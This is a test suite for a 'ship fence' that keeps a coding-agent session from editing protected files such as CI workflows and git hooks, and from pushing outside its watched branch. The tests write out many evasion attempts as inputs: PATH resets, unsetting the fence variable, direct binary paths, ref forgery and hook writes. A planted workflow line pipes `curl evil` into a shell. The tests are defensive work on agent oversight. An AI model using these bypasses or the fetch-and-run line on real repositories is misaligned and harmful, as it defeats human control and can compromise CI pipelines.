import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execFileSync, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as path from "node:path";
import shipFence from "../ship-fence";
import { fakeContext, fakePi, privateHome, resetHome } from "../test-harness";
import { armFence, checkPushContent, currentState, disarmFence, FENCE_ENV, type Git, installFence, readState, realGit, SHIM_DIR, stateDir } from "./fence-state";
import { checkToolCall } from "./fence-tools";

const BRANCH = "feat/ship-s1";
const sh = (cwd: string, ...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd, encoding: "utf8", env: { ...process.env, PATH: savedPath } });
const write = (file: string, text: string) => {
	fs.mkdirSync(path.dirname(file), { recursive: true });
	fs.writeFileSync(file, text);
};

let savedPath: string | undefined;
let repo: string;

/** A repo whose origin is a local bare repo: main holds a workflow and code, and the watched branch is checked out. */
function setup(): void {
	const home = privateHome();
	const bare = path.join(home, "remote.git");
	repo = path.join(home, "projects", "app");
	execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", bare]);
	fs.mkdirSync(repo, { recursive: true });
	sh(repo, "init", "--quiet", "-b", "main");
	sh(repo, "remote", "add", "origin", bare);
	write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n");
	write(path.join(repo, "src/a.ts"), "export const a = 1;\n");
	sh(repo, "add", "-A");
	sh(repo, "commit", "--quiet", "-m", "init");
	sh(repo, "push", "--quiet", "origin", "main");
	sh(repo, "remote", "set-head", "origin", "main");
	sh(repo, "switch", "--quiet", "-c", BRANCH);
}

beforeEach(() => {
	resetHome();
	savedPath = process.env.PATH;
	delete process.env[FENCE_ENV];
	setup();
	installFence();
});
afterEach(() => {
	delete process.env[FENCE_ENV];
	process.env.PATH = savedPath;
});

describe("state", () => {
	test("loading names a state file, unarmed, puts the shims first once, and removes files of exited processes", () => {
		const stale = path.join(stateDir(), "999999.json");
		fs.writeFileSync(stale, "{}");
		delete process.env[FENCE_ENV];
		installFence();
		installFence();
		expect(fs.existsSync(stale)).toBe(false);
		expect(currentState().armed).toBe(false);
		const entries = (process.env.PATH ?? "").split(path.delimiter);
		expect(entries[0]).toBe(SHIM_DIR);
		expect(entries.filter(e => e === SHIM_DIR)).toHaveLength(1);
	});

	test("arming records the branch, the git folders and the protected files; disarming keeps the file, unarmed", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const state = currentState();
		expect(state).toMatchObject({ armed: true, pushBranch: BRANCH, root: fs.realpathSync(repo) });
		expect(Object.keys(state.snapshot)).toEqual([".github/workflows/ci.yml"]);
		expect(state.gitDirs).toContain(fs.realpathSync(path.join(repo, ".git")));
		disarmFence();
		expect(currentState()).toMatchObject({ armed: false, pushBranch: null });
	});

	test("a missing state is unarmed; an unreadable one is armed and pushes nothing", () => {
		const bad = path.join(privateHome(), "bad.json");
		fs.writeFileSync(bad, "{");
		expect(readState(path.join(privateHome(), "missing.json")).armed).toBe(false);
		expect(readState(bad)).toMatchObject({ armed: true, pushBranch: null });
	});
});

describe("tool calls while armed", () => {
	const call = (toolName: string, input: Record<string, unknown>, cwd = repo) => checkToolCall(toolName, input, currentState(), cwd);
	beforeEach(() => armFence({ pushBranch: BRANCH, root: repo }));

	test("protected files are refused by any spelling: case, symlink, a URL-looking prefix, conflict://, the absolute name", () => {
		fs.symlinkSync(".github", path.join(repo, "ghlink"));
		fs.symlinkSync("src/a.ts", path.join(repo, "alias.ts"));
		for (const p of [".github/workflows/ci.yml", ".GITHUB/workflows/ci.yml", "ghlink/workflows/ci.yml", "x://../CLAUDE.md", "AGENTS.md", ".envrc", path.join(repo, ".github/x.yml"), "conflict://1"]) {
			expect(call("write", { path: p, content: "x" })).toContain("ship fence");
		}
		for (const p of ["src/a.ts", "alias.ts", ".env.example", "docs/github.md", path.join(privateHome(), "notes.md"), "local://plan.md"]) {
			expect(call("write", { path: p, content: "x" })).toBeNull();
		}
	});

	test("edit payloads that delete or rename into a protected file, and ast_edit over folders, patterns or lists that reach one", () => {
		expect(call("edit", { input: "*** Begin Patch\n*** Delete File: .github/workflows/ci.yml\n*** End Patch" })).toContain(".github/workflows/ci.yml");
		expect(call("edit", { path: "scratch.yml", rename: ".github/workflows/evil.yml", input: "x" })).toContain("evil.yml");
		expect(call("ast_edit", { paths: [repo] })).toContain("holds files /ship never edits");
		expect(call("ast_edit", { paths: [".github"] })).toContain(".github");
		expect(call("ast_edit", { paths: ["**/*.yml"] })).toContain("not a pattern");
		expect(call("ast_edit", { paths: "src/a.ts;lefthook.yml" })).toContain("lefthook.yml");
		expect(call("ast_edit", { paths: ["src"] })).toBeNull();
	});

	test("a linked worktree's hooks live in the main repo's git folder, and they are refused too", () => {
		const wt = path.join(privateHome(), "projects", "app-wt");
		sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
		armFence({ pushBranch: "feat/wt", root: wt });
		for (const p of [path.join(repo, ".git/hooks/pre-push"), "../app/.git/config", ".git"]) expect(call("write", { path: p, content: "x" }, wt)).toContain("ship fence");
	});

	test("the fence's own files are refused to tools and to shell lines", () => {
		expect(call("write", { path: path.join(SHIM_DIR, "git"), content: "x" })).toContain("ship fence");
		expect(call("write", { path: process.env[FENCE_ENV] as string, content: "{}" })).toContain("ship fence");
		expect(call("bash", { command: `rm ${process.env[FENCE_ENV]}` })).toContain("own files");
		expect(call("bash", { command: "echo '{\"armed\":false}' > \"$OMP_SHIP_FENCE\"" })).toContain("own files");
	});

	test("shell lines that step around the shims are refused; ones that only mention the words pass", () => {
		for (const command of [
			"PATH=/usr/bin:/bin git push origin main",
			"export PATH=/usr/bin",
			"env -u OMP_SHIP_FENCE gh pr merge 5",
			"env -i git push origin main",
			"OMP_SHIP_FENCE= git push origin main",
			"command -p git push origin main",
			"/opt/homebrew/bin/gh pr merge 5",
			"./git push origin main",
			"~/.local/bin/gh pr merge 5",
			"/usr/bin/g?t push origin main",
			"$(which -a git | tail -1) push origin main",
			"GIT_CONFIG_PARAMETERS=\"'core.hooksPath=/x'\" git commit -m x",
			"curl -X PUT https://api.github.com/repos/o/r/pulls/5/merge",
			"gh auth token",
		]) {
			expect(call("bash", { command })).toContain("ship fence");
		}
		for (const command of ["rg 'PATH=' .github/workflows", "rg OMP_SHIP_FENCE_DOCS docs/", "git commit -m \"fix: keep PATH=/usr/bin out of the build script\"", "ls -la /usr/bin/git", "echo $PATH", "gh pr view 5", "bun test"]) {
			expect(call("bash", { command })).toBeNull();
		}
		expect(call("eval", { code: "import os\nos.environ['PATH'] = '/usr/bin'" })).toContain("ship fence");
		expect(call("eval", { code: 'subprocess.run(["/opt/homebrew/bin/gh", "pr", "merge"])' })).toContain("by name");
	});

	test("the github tool opens drafts and pushes only the watched branch", () => {
		expect(call("github", { op: "pr_create", title: "t" })).toContain("draft");
		expect(call("github", { op: "pr_push", branch: BRANCH, forceWithLease: true })).toContain("force");
		expect(call("github", { op: "pr_push", branch: "main" })).toContain("pushes only to");
		expect(call("github", { op: "pr_push", branch: BRANCH })).toBeNull();
	});
});

test("the extension refuses only while the fence is armed", async () => {
	const fake = fakePi();
	shipFence(fake.pi);
	const ctx = fakeContext({ cwd: repo, agent: { kind: "main", name: "main" } });
	const merge = { toolName: "bash", input: { command: "/opt/homebrew/bin/gh pr merge 5" } };
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
	armFence({ pushBranch: BRANCH, root: repo });
	expect(((await fake.emit("tool_call", merge, ctx)) as { block?: boolean } | undefined)?.block).toBe(true);
	disarmFence();
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
});

describe("the shims, with real git", () => {
	const git = (env: NodeJS.ProcessEnv, ...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: repo, env, encoding: "utf8" });

	test("unarmed, they pass everything through; armed, they refuse another branch and let the watched one go", () => {
		expect(git(process.env, "push", "--quiet", "origin", "HEAD:refs/heads/free").status).toBe(0);
		armFence({ pushBranch: BRANCH, root: repo });
		const other = git(process.env, "push", "origin", "HEAD:refs/heads/other");
		expect(other.status).toBe(1);
		expect(other.stderr).toContain(`ship fence: this session pushes only to ${BRANCH}`);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		expect(git(process.env, "rev-parse", "--is-inside-work-tree").stdout.trim()).toBe("true");
	});

	test("a push carrying a change to a protected file is refused, however the file was edited; one the base brought passes", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		expect(git(process.env, "commit", "--quiet", "-am", "tweak").status).toBe(0);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");

		sh(repo, "reset", "--quiet", "--hard", "HEAD~1");
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a base merge that brings a protected change onto a branch origin already holds passes too", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	const bare = () => path.join(privateHome(), "remote.git");
	/** What origin holds for `branch`: a commit id, or "" when it has no such branch. */
	const originHas = (branch: string) => spawnSync("git", ["--git-dir", bare(), "for-each-ref", "--format=%(objectname)", `refs/heads/${branch}`], { env: { ...process.env, PATH: savedPath }, encoding: "utf8" }).stdout.trim();
	/** Commits the workflow change a fenced session may not push, and returns that commit. */
	const evilWorkflow = (): string => {
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		sh(repo, "commit", "--quiet", "-am", "tweak");
		return sh(repo, "rev-parse", "HEAD").trim();
	};
	/** A second clone of origin, where someone else works, on `BRANCH`; its git folder is `gitdir` when given. */
	const teammate = (gitdir?: string): string => {
		const dir = path.join(privateHome(), "projects", "other");
		sh(privateHome(), "clone", "--quiet", ...(gitdir ? ["--separate-git-dir", gitdir] : []), bare(), dir);
		sh(dir, "switch", "--quiet", "-c", BRANCH);
		return dir;
	};

	describe("the push check reads origin itself, not the remote-tracking refs the session can move", () => {
		const planted: [string, (evil: string) => void][] = [
			["update-ref on the branch's tracking ref", evil => sh(repo, "update-ref", `refs/remotes/origin/${BRANCH}`, evil)],
			["update-ref on origin/main, which is the base", evil => sh(repo, "update-ref", "refs/remotes/origin/main", evil)],
			["fetch . onto the branch's tracking ref", () => sh(repo, "fetch", "--quiet", ".", `HEAD:refs/remotes/origin/${BRANCH}`)],
			["origin/HEAD pointed at a ref that holds the change", evil => {
				sh(repo, "update-ref", "refs/remotes/origin/evil", evil);
				sh(repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/evil");
			}],
		];
		for (const [name, plant] of planted) {
			test(name, () => {
				armFence({ pushBranch: BRANCH, root: repo });
				plant(evilWorkflow());
				const push = git(process.env, "push", "origin", BRANCH);
				expect(push.status).toBe(1);
				expect(push.stderr).toContain("would change .github/workflows/ci.yml");
				expect(originHas(BRANCH)).toBe("");
			});
		}
	});

	test("update-ref and fetch . onto remote-tracking refs are refused by the shim, and the change stays off origin", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const evil = evilWorkflow();
		for (const args of [["update-ref", `refs/remotes/origin/${BRANCH}`, evil], ["update-ref", "refs/remotes/origin/main", evil], ["fetch", ".", `HEAD:refs/remotes/origin/${BRANCH}`]]) {
			const r = git(process.env, ...args);
			expect(r.status).toBe(1);
			expect(r.stderr).toContain("ship fence");
		}
		expect(sh(repo, "for-each-ref", "--format=%(objectname)", "refs/remotes")).not.toContain(evil);
		expect(git(process.env, "push", "origin", BRANCH).status).toBe(1);
		expect(originHas(BRANCH)).toBe("");
	});

	test("a replacement ref does not show the push check another tree than the one the push sends", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const benign = sh(repo, "rev-parse", "HEAD").trim();
		const evil = evilWorkflow();
		expect(git(process.env, "update-ref", `refs/replace/${evil}`, benign).status).toBe(1);
		sh(repo, "update-ref", `refs/replace/${evil}`, benign);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("only origin's own branch counts as its tip: ls-remote also lists refs whose name merely ends the same way", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const evil = evilWorkflow();
		// Someone else put the change on a branch named like the watched one's full ref name.
		sh(repo, "push", "--quiet", "origin", `${evil}:refs/heads/refs/heads/${BRANCH}`);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("moving a protected file away is a change to it", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		fs.mkdirSync(path.join(repo, "docs"));
		sh(repo, "mv", ".github/workflows/ci.yml", "docs/ci.yml");
		sh(repo, "commit", "--quiet", "-m", "move the workflow");
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");
		expect(originHas(BRANCH)).toBe("");
	});

	test("git that writes where it is told does not write into the git folder, however it is reached", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const hooks = path.join(repo, ".git", "hooks");
		const template = path.join(privateHome(), "template");
		write(path.join(template, "hooks", "pre-commit"), "#!/bin/sh\nexit 0\n");
		fs.chmodSync(path.join(template, "hooks", "pre-commit"), 0o755);
		fs.symlinkSync(".git/hooks", path.join(repo, "hk"));
		for (const args of [
			["diff", "--output=.git/hooks/pre-commit"],
			["archive", "-o", ".git/hooks/pre-commit", "HEAD"],
			["checkout-index", "--prefix=.git/hooks/", "-a"],
			["bundle", "create", ".git/hooks/pre-commit", "HEAD"],
			["init", `--template=${template}`],
			// Running init again copies the templates in, however they are named.
			["init"],
			["-c", `init.templateDir=${template}`, "init"],
			["-C", "src", "archive", "-o", "../.git/hooks/pre-commit", "HEAD"],
			["archive", "-o", path.join(hooks, "pre-commit"), "HEAD"],
			["archive", "-o", "hk/pre-commit", "HEAD"],
			["--work-tree=.git/hooks", "checkout", "HEAD", "--", "src/a.ts"],
			// A `..` after a symlink leaves the link's target, so these reach .git itself.
			["checkout-index", "--prefix=hk/../", "-f", "src/a.ts"],
			["-C", "hk/..", "archive", "-o", "config", "HEAD"],
		]) {
			const r = git(process.env, ...args);
			expect(r.status).toBe(1);
			expect(r.stderr).toContain("ship fence");
		}
		const viaEnv = git({ ...process.env, GIT_TEMPLATE_DIR: template }, "init");
		expect(viaEnv.status).toBe(1);
		expect(viaEnv.stderr).toContain("ship fence");
		// A fresh folder is none of the fence's business.
		expect(git(process.env, "init", "--quiet", path.join(privateHome(), "fresh")).status).toBe(0);
		const inside = spawnSync("git", ["archive", "-o", "pre-commit", "HEAD"], { cwd: hooks, env: process.env, encoding: "utf8" });
		expect(inside.status).toBe(1);
		expect(fs.readdirSync(hooks).filter(name => !name.endsWith(".sample"))).toEqual([]);
		expect(fs.existsSync(path.join(repo, ".git", "src"))).toBe(false);
		expect(sh(repo, "config", "--get", "remote.origin.url")).toContain("remote.git");
	});

	test("a push run against another repo with --git-dir is refused, so the check always reads the repo that pushes", () => {
		const gitdir = path.join(privateHome(), "other-gd");
		const other = teammate(gitdir);
		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		sh(other, "commit", "--quiet", "-am", "tweak");
		armFence({ pushBranch: BRANCH, root: repo });
		const push = git(process.env, "--git-dir", gitdir, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("--git-dir");
		expect(originHas(BRANCH)).toBe("");
	});

	test("a push waits for a fetch while origin holds a commit this checkout lacks; then it goes", () => {
		const other = teammate();
		write(path.join(other, "src/b.ts"), "export const b = 1;\n");
		sh(other, "add", "-A");
		sh(other, "commit", "--quiet", "-m", "teammate");
		sh(other, "push", "--quiet", "origin", BRANCH);
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "mine");
		const blocked = git(process.env, "push", "origin", BRANCH);
		expect(blocked.status).toBe(1);
		expect(blocked.stderr).toContain("fetch origin first");
		expect(blocked.stderr).not.toContain("This is final");
		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

		write(path.join(other, "README.md"), "base moved\n");
		sh(other, "add", "-A");
		sh(other, "commit", "--quiet", "-m", "base moves");
		sh(other, "push", "--quiet", "origin", "HEAD:refs/heads/main");
		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
		sh(repo, "commit", "--quiet", "-am", "mine again");
		expect(git(process.env, "push", "origin", BRANCH).stderr).toContain("fetch origin first");
		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a protected change the branch held when /ship armed, or origin's branch already holds, is not the push's", () => {
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [pull_request]\n");
		sh(repo, "commit", "--quiet", "-am", "the user's own edit");
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);

		const other = teammate();
		sh(other, "fetch", "--quiet", "origin", BRANCH);
		sh(other, "reset", "--quiet", "--hard", `origin/${BRANCH}`);
		write(path.join(other, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(other, "commit", "--quiet", "-am", "teammate edits the workflow");
		sh(other, "push", "--quiet", "origin", BRANCH);
		expect(git(process.env, "fetch", "--quiet", "origin").status).toBe(0);
		expect(git(process.env, "merge", "--quiet", "--no-edit", `origin/${BRANCH}`).status).toBe(0);
		write(path.join(repo, "src/a.ts"), "export const a = 3;\n");
		sh(repo, "commit", "--quiet", "-am", "session fix 2");
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a push is refused, not waved through, when origin can't be read", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const down: Git = (dir, ...args) => (args[0] === "ls-remote" ? { code: 128, out: "" } : realGit(dir, ...args));
		expect(checkPushContent(repo, [BRANCH], currentState(), down)).toContain("origin");
		expect(checkPushContent(repo, [BRANCH], { ...currentState(), pushBranch: null })).toContain("pushes nothing");
	});

	test("a call whose environment lost the state name is refused", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const env = { ...process.env };
		delete env[FENCE_ENV];
		const r = git(env, "status");
		expect(r.status).toBe(1);
		expect(r.stderr).toContain(`${FENCE_ENV} was removed`);
	});
});
